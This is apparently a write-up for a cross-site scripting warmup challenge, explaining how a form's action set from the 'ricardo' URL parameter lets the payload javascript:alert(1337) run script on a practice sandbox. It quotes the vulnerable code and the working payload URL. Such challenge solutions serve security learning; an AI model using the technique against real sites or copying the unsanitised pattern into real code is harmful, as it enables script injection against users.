# Ricardo Milos - Exercise 6

[Problem](https://xss.pwnfunction.com/warmups/ricardo/)

[Solution](https://sandbox.pwnfunction.com/warmups/ricardo.html?ricardo=javascript:alert(1337))

## Explanation

Here is the part of the sourde code where we can inject Javascript.

```html
<form id="ricardo" method="GET">
    <input name="milos" type="text" class="form-control" placeholder="True" value="True">
</form>
<script>
    ricardo.action = (new URL(location).searchParams.get('ricardo') || '#')
    setTimeout(_ => {
        ricardo.submit()
    }, 2000)
</script>
```

The answer is pretty straight forward. We can change the value of `action` of the form using the parameter `ricardo`. Simply setting the parameter `ricardo` to `javascript:alert(1337)` will do the job.
